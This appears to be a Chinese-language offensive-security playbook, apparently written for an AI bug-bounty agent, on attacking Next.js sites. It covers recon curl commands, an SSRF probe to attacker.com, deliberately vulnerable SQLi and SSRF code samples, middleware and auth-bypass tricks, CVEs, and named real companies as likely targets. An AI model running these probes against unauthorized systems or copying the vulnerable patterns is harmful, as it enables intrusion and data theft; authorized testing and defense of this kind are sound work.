---
name: nextjs
description: Next.js 目标栈专项 playbook — Server Actions / API Routes / SSR / Middleware 绕过 / Image Optimization SSRF / __NEXT_DATA__ 信息泄露。React 全栈框架。
category: frameworks
tags: [framework, javascript, nextjs, react, ssr, serverless]
---

# Next.js Playbook

---

## 1. 指纹识别

| 信号 | 含义 |
| :--- | :--- |
| `/_next/static/` 路径 | Next.js 默认静态资源前缀 |
| `__NEXT_DATA__` script tag | SSR hydration data |
| `/_next/data/<buildid>/` | SSG/SSR JSON endpoint |
| `x-powered-by: Next.js` | 旧版默认 |
| `/api/` endpoint | API Routes |
| `_next/image?url=` | Image Optimization 端点 |
| `next-action` Header | Server Actions |
| `_buildManifest.js` | 暴露所有 route 名 |

---

## 2. 攻击面地图

### 2.1 `__NEXT_DATA__` (信息泄露)

页面源码 `<script id="__NEXT_DATA__">` 含完整 SSR props,常含:
- API key / token (开发疏忽)
- 内部用户数据 (跨用户泄露)
- 内部 endpoint
- 用户角色 / 权限 flags

### 2.2 `/_next/data/<buildId>/page.json` (绕前端鉴权)

```bash
# 拿 buildId
curl https://target/ | grep -oE '"buildId":"[^"]+"'
# 拉某页面 SSR JSON
curl https://target/_next/data/<buildId>/admin/users.json
# 可能绕过前端鉴权(后端 props 返回但前端 hide)
```

### 2.3 API Routes (`/api/*`)

```javascript
// pages/api/user/[id].js
export default function handler(req, res) {
  const user = db.query(`SELECT * FROM users WHERE id=${req.query.id}`);  // SQLi
  res.json(user);
}
```

常见: SQLi / BOLA / BFLA / SSRF / Path traversal。

### 2.4 Server Actions (Next.js 13+)

```jsx
// 'use server'
async function deleteUser(id) {
  await db.delete(id);   // 无鉴权
}
```

Header `Next-Action` 触发。常见: 无鉴权 / CSRF / 被前端 JS 直接调用绕权限。

### 2.5 Image Optimization SSRF

```bash
https://target/_next/image?url=https://internal-server/secret&w=640&q=75
```

默认配置允许优化任意 URL → SSRF。`next.config.js` 应配 `domains` 白名单。

### 2.6 Middleware 绕过

```javascript
// middleware.js
export function middleware(req) {
  if (!isAuthorized(req)) return Response.redirect('/login');
}
```

绕过: 路径规范化 `/admin/../admin` / 大小写 `/ADMIN` / regex 不严 / API vs Pages Routes 不一致 / App vs Pages Router 混用。

### 2.7 ISR Cache Poisoning

Vary Header 不全 / query string 不在 cache key → 任意污染。

### 2.8 `getServerSideProps` SSRF

```javascript
export async function getServerSideProps(context) {
  const data = await fetch(`https://api/${context.query.path}`);  // SSRF
}
```

### 2.9 Dynamic Routes catch-all

`pages/[...slug].js` → 任意路径触发。

---

## 3. 高价值入口

1. **`/_next/data/<buildId>/admin/*.json`** — 绕前端鉴权拉数据 (P0)
2. **`/api/*` SQLi / BOLA** — serverless 主战场 (P0)
3. **`__NEXT_DATA__` 含 API key** — 信息泄露 (P0)
4. **`/_next/image?url=`** — SSRF (P0)
5. **Server Actions 无鉴权** — 任意函数调用 (P0)
6. **Middleware 路径绕过** — 鉴权绕过 (P0)
7. **`getServerSideProps` SSRF** — 内网访问 (P0)

---

## 4. CVE / 历史漏洞

| CVE | 影响 | 版本 |
| :--- | :--- | :--- |
| CVE-2024-46982 | Cache poisoning | < 13.5.1 / < 14.2.10 |
| CVE-2024-34351 | SSRF in Server Actions | < 14.1.1 |
| CVE-2023-46298 | Path traversal in image optimization | < 13.4.3 |
| CVE-2022-23646 | XSS via SSR | < 12.1.0 |
| CVE-2020-5284 | Path traversal | < 9.3.2 |

---

## 5. 系统化 Recon

```bash
# buildId
curl -s https://target/ | grep -oE '"buildId":"[^"]+"'

# __NEXT_DATA__
curl -s https://target/admin/dashboard | grep -oE '<script id="__NEXT_DATA__"[^>]*>[^<]+</script>'

# 所有 route
curl https://target/_next/static/<buildId>/_buildManifest.js

# API 探测
for p in api/health api/user/1 api/admin api/internal api/v1 api/v2 api/auth; do
  curl -s -o /dev/null -w "[$p] %{http_code}\n" https://target/$p
done

# Image SSRF
curl "https://target/_next/image?url=https://attacker.com/probe&w=640&q=75"

# SSR JSON 绕前端
curl https://target/_next/data/$BUILDID/admin/users.json
```

---

## 6. 利用链优先级

### 6.1 Next.js
1. 提取 `__NEXT_DATA__` 看敏感字段
2. 拿 buildId → 拉所有 admin SSR JSON
3. 测 `/_next/image?url=` SSRF (优先云元数据)
4. 拉 `_buildManifest.js` 列所有 route

### 6.2 API Routes
1. BOLA: `/api/user/1` → `/api/user/2`
2. BFLA: 普通 token 调 admin endpoint
3. SQLi: 走 [vuln/sqli.md](../vuln/sqli.md)

### 6.3 Server Actions
1. 抓包看 `Next-Action` Header
2. console 直接调,看是否绕 UI 校验
3. CSRF 测试

---

## 7. False Positives

| 现象 | 真实判断 |
| :--- | :--- |
| `__NEXT_DATA__` 含 sessionId | 可能是 fingerprint | 看是否可用 |
| `/_next/image?url=` 400 | 已配白名单 | 试 `@` / 子域绕过 |
| SSR JSON 404 | buildId/路径错 | 重新拉 |
| Middleware 绕 200 内容空 | 仅路由绕过 | 看是否真有数据 |

---

## 8. Impact 证据

| 漏洞 | Impact | 证据 |
| :--- | :--- | :--- |
| `__NEXT_DATA__` 泄 API key | 凭证泄露 | 截图 + 验证 key 可用 |
| `/_next/image` SSRF → 云元数据 | 接管云 | OOB + AK (HITL) |
| API Route SQLi | 全库 | sqlmap 脱敏 |
| Server Action 无鉴权 | 任意调用 | 普通用户调 admin Action |
| Middleware 绕 admin | 提权 | 1 个 admin endpoint 截图 |
| ISR cache poison | 跨用户 | 多账号 cache 差异 |

---

## 9. Pro Tips

- **`__NEXT_DATA__` 第一时间拉**: 90% Next.js 站有,常含 server-side props 不该有的字段
- **buildId 是核心**: 拿到 buildId → 所有 SSR endpoint 都能拉
- **Image SSRF 经典**: 国内 Next.js 站 90% 没配 `domains` 白名单
- **App Router vs Pages Router**: 同站可能混用 → middleware 漏覆盖
- **Server Actions 是新攻击面**: 2023+,SRC 还不熟,高 ROI
- **`process.env.NEXT_PUBLIC_*`**: 暴露到客户端,常存敏感
- **`/api/auth/[...nextauth]`**: NextAuth.js 历史 CVE
- **Vercel 部署**: `_vercel/...` 路径有时暴露 build info
- **国内实战**: 字节 / 知乎 / 创业团队 — `__NEXT_DATA__` + SSRF 高命中
- **GraphQL 集成**: 配合 Apollo,走 [vuln/graphql-websocket.md](../vuln/graphql-websocket.md)

---

## 10. 工具升级线

**classic 版**:
- buildId 抓: curl + grep
- API 探测: `ffuf -w api-routes.txt`
- SSR JSON 枚举: 自写 Python

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` sweep `/_next/data/<buildId>/<route>.json`
- `mcp__chrome__chrome_navigate` + `evaluate_script` 提取 `__NEXT_DATA__`
- `mcp__yaklang__ssa_compile language="js"` + SyntaxFlow 找 API Route sink

---

## 11. 相关参考

- 通用 vuln: [../vuln/](../vuln/)
- API 安全: [../api-security.md](../api-security.md)
- SSRF: [../vuln/ssrf.md](../vuln/ssrf.md)
- SQLi: [../vuln/sqli.md](../vuln/sqli.md)
- 路径遍历: [../vuln/path-traversal.md](../vuln/path-traversal.md)
- 原型污染 (Node): [../vuln/prototype-pollution.md](../vuln/prototype-pollution.md)
- GraphQL: [../vuln/graphql-websocket.md](../vuln/graphql-websocket.md)
- 云安全: [../cloud-security.md](../cloud-security.md)
